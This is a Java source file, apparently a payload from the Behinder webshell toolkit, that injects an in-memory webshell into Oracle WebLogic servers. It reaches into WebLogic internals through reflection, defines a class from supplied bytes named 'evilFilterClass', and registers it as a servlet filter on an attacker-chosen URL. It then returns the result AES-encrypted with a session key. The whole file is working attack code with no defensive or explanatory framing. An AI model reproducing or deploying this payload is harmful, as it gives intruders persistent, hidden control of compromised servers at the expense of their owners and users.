package net.rebeyond.behinder.payload.java.memoryshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Weblogic {
    public static String urlPattern;
    public static String shellString;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public boolean equals(Object object) {
        PageContext page = (PageContext)object;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();

        try {
            Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());

            Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);

            Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);

            Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);

            Field classLoaderF = context.getClass().getDeclaredField("classLoader");
            classLoaderF.setAccessible(true);
            ClassLoader cl = (ClassLoader) classLoaderF.get(context);

            Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
            cachedClassesF.setAccessible(true);
            Object cachedClass = cachedClassesF.get(cl);

            Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
            String classN = "FilterClass" + System.currentTimeMillis();
            String filterN = "FilterName" + System.currentTimeMillis();
            if (getM.invoke(cachedClass, classN) == null) {
                byte[] bytes = shellString.getBytes(StandardCharsets.ISO_8859_1);
                Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class evilFilterClass = (Class) defineClass.invoke(cl, bytes, 0, bytes.length);

                Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                putM.invoke(cachedClass, classN, evilFilterClass);
            }
            Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
            Object filterManager = getFilterManagerM.invoke(context);

            Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
            registerFilterM.setAccessible(true);
            registerFilterM.invoke(filterManager, filterN, classN, new String[]{urlPattern}, null, null, null);

            result.put("msg", "成功");
            result.put("status", "success");
        } catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode)
            {
                if (version.compareTo("1.9") >= 0) {

                    getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                }
                else {

                    getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}